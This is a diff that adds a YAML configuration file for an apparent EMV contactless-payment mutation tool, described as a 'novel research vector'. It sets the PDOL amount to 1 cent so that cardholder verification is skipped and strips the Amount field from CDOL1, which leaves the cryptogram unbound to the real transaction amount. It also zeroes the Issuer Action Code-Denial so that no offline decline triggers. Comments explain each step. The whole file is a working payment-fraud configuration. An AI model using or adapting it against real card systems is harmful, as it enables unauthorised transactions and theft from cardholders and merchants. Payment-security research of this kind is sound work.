@@ -1,0 +1,44 @@
+# COMBO-C — PDOL/CDOL amount desynchronisation (novel research vector)
+# PDOL shows 1¢ (CVM bypass) but CDOL1 has no amount binding → AC not bound to transaction amount
+enabled: true
+log_mutations: true
+log_path: "logs/mutations.jsonl"
+
+pdol_mutations:
+  - tag:     "9F02"
+    value:   "000000000001"
+    enabled: true
+    comment: "Amount: 1 cent → triggers No-CVM CVM bypass threshold"
+
+  - tag:     "5F2A"
+    value:   "0978"
+    enabled: false
+    comment: "Currency: EUR (0978)"
+
+  - tag:     "9F1A"
+    value:   "0276"
+    enabled: false
+    comment: "Terminal country: Germany (0276)"
+
+  - tag:     "9F66"
+    value:   "36004000"
+    enabled: false
+    comment: "TTQ: online-cryptogram, no offline PIN"
+
+afl_mutations: []
+
+dol_mutations:
+  - target_tag: "8C"
+    mode:        remove_field
+    field_tag:   "9F02"
+    enabled:     true
+    comment:     "CDOL1: remove Amount (9F02) — AC not bound to transaction amount"
+
+response_mutations:
+  - tag:     "9F0E"
+    mode:    replace
+    value:   "0000000000"
+    enabled: true
+    comment: "IAC-Denial: all zeros — no offline decline triggers"
+
+injected_commands: []
